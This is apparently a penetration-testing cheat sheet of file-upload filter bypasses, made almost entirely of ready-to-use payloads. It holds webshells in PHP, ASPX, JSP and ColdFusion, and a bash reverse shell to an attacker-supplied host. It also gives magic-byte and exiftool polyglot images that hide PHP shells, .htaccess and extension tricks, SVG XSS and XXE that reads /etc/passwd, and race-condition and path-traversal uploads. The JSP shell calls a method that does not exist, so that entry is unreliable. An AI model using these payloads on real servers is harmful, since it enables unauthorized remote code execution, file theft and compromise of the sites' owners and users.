# File Upload Bypass

> Bypass file-upload filters — extension tricks, MIME, magic bytes, double-ext, web-shells

<!-- tags: upload, bypass, web, payload, rce, webshell -->

---

## Upload - Detect Allowed Extensions
Probe baseline allowed types.

```bash
for ext in jpg png gif pdf txt doc xlsx zip; do echo "test.${ext}"; done
```

<!-- meta: risk=safe | phase=enum | tags=upload,enum -->

---

## Upload - Minimal PHP Webshell
Simplest PHP one-liner shell.

```bash
echo '<?php system($_GET["c"]); ?>'
```

<!-- meta: risk=critical | phase=exploit | tags=upload,php,webshell -->

---

## Upload - PHP Webshell (POST)
POST-based shell to evade GET logging.

```bash
echo '<?php if(isset($_POST["c"])){system($_POST["c"]);} ?>'
```

<!-- meta: risk=critical | phase=exploit | tags=upload,php,webshell -->

---

## Upload - PHP Reverse Shell One-Liner
Inline reverse shell via PHP.

```bash
echo '<?php system("/bin/bash -c '"'"'bash -i >& /dev/tcp/{{LHOST:ip}}/{{LPORT:port:9001}} 0>&1'"'"'"); ?>'
```

<!-- meta: risk=critical | phase=exploit | tags=upload,php,revshell -->

---

## Upload - Bypass: Alternate PHP Extensions
When .php is blocked, try variants.

```bash
echo "shell.php3 shell.php4 shell.php5 shell.php7 shell.phtml shell.phar shell.pht shell.phps shell.inc"
```

<!-- meta: risk=med | phase=exploit | tags=upload,bypass,extension -->

---

## Upload - Bypass: Mixed Case
Extension case-only checks.

```bash
echo "shell.PhP shell.PHP shell.pHp5 shell.PHp7"
```

<!-- meta: risk=med | phase=exploit | tags=upload,bypass,case -->

---

## Upload - Bypass: Double Extension
Bypass naive last-token check.

```bash
echo "shell.php.jpg shell.jpg.php shell.php%00.jpg shell.php;.jpg"
```

<!-- meta: risk=med | phase=exploit | tags=upload,bypass,doubleext -->

---

## Upload - Bypass: Null Byte
Truncate extension on legacy stacks.

```bash
echo "shell.php%00.jpg"
```

<!-- meta: risk=med | phase=exploit | tags=upload,bypass,nullbyte -->

---

## Upload - Bypass: Magic Bytes (GIF89a)
Prepend GIF header so magic-byte check passes.

```bash
printf 'GIF89a;\n<?php system($_GET[0]); ?>' > shell.php.gif
```

<!-- meta: risk=high | phase=exploit | tags=upload,bypass,magicbytes -->

---

## Upload - Bypass: Magic Bytes (PNG)
PNG magic header.

```bash
printf '\x89PNG\r\n\x1a\n<?php system($_GET[0]); ?>' > shell.php.png
```

<!-- meta: risk=high | phase=exploit | tags=upload,bypass,magicbytes -->

---

## Upload - Bypass: Magic Bytes (JPEG)
JPEG magic header.

```bash
printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00<?php system($_GET[0]); ?>' > shell.php.jpg
```

<!-- meta: risk=high | phase=exploit | tags=upload,bypass,magicbytes -->

---

## Upload - Bypass: Content-Type Header
Force allowed MIME via curl.

```bash
curl -F "file=@shell.php;type=image/jpeg" -F "submit=Upload" {{URL:url:http://target.htb/upload.php}}
```

<!-- meta: risk=med | phase=exploit | tags=upload,bypass,mime -->

---

## Upload - Bypass: .htaccess
Drop .htaccess to make custom ext run as PHP.

```bash
echo "AddType application/x-httpd-php .pwn" > .htaccess
```

<!-- meta: risk=high | phase=exploit | tags=upload,bypass,htaccess -->

---

## Upload - Bypass: Apache Multiple Extensions
Apache parses leftmost recognized ext.

```bash
echo "shell.php.foo shell.foo.php shell.php.gif"
```

<!-- meta: risk=med | phase=exploit | tags=upload,bypass,apache -->

---

## Upload - Bypass: IIS Semicolon
IIS <7 parses ;.ext to ignore filter ext.

```bash
echo "shell.asp;.jpg"
```

<!-- meta: risk=med | phase=exploit | tags=upload,bypass,iis -->

---

## Upload - Bypass: IIS Tilde Short Name
Short-name disclosure.

```bash
curl -s "{{URL:url:http://target.htb/}}*~1*/.aspx"
```

<!-- meta: risk=safe | phase=enum | tags=upload,iis,shortname -->

---

## Upload - Bypass: SVG XSS
SVG with embedded JS.

```bash
echo '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(1)</script></svg>' > xss.svg
```

<!-- meta: risk=med | phase=exploit | tags=upload,svg,xss -->

---

## Upload - Bypass: SVG XXE
SVG with XXE for file read.

```bash
echo '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>' > xxe.svg
```

<!-- meta: risk=high | phase=exploit | tags=upload,svg,xxe -->

---

## Upload - Webshell ASPX
ASPX shell for IIS.

```bash
echo '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]);%>'
```

<!-- meta: risk=critical | phase=exploit | tags=upload,iis,aspx,webshell -->

---

## Upload - Webshell JSP
JSP shell for Tomcat.

```bash
echo '<%Runtime.getRuntime().shellRun(request.getParameter("c"));%>'
```

<!-- meta: risk=critical | phase=exploit | tags=upload,jsp,tomcat -->

---

## Upload - Webshell Cold Fusion
ColdFusion CFM shell.

```bash
echo '<cfexecute name="cmd.exe" arguments="/c #URL.cmd#" timeout="20"></cfexecute>'
```

<!-- meta: risk=critical | phase=exploit | tags=upload,coldfusion,webshell -->

---

## Upload - Polyglot JPEG+PHP
Image-valid + PHP shell.

```bash
exiftool -Comment='<?php system($_GET[0]); ?>' image.jpg && mv image.jpg image.php.jpg
```

<!-- meta: risk=high | phase=exploit | tags=upload,polyglot,exiftool -->

---

## Upload - Race Condition
Upload + run before cleanup.

```bash
while true; do curl -F "file=@shell.php" {{URL:url:http://target.htb/upload.php}}; curl -s {{URL:url:http://target.htb/uploads/shell.php?c=id}}; done
```

<!-- meta: risk=high | phase=exploit | tags=upload,race -->

---

## Upload - Path Traversal in Filename
Try escape with .. in name.

```bash
curl -F 'file=@shell.php;filename=../../../var/www/html/shell.php' {{URL:url:http://target.htb/upload.php}}
```

<!-- meta: risk=high | phase=exploit | tags=upload,traversal -->

---

## Upload - ZIP Slip
Tar/zip with traversal entries.

```bash
mkdir -p slip && ln -s ../../../../etc/passwd slip/link && tar -cvf slip.tar slip/
```

<!-- meta: risk=high | phase=exploit | tags=upload,zip,slip -->
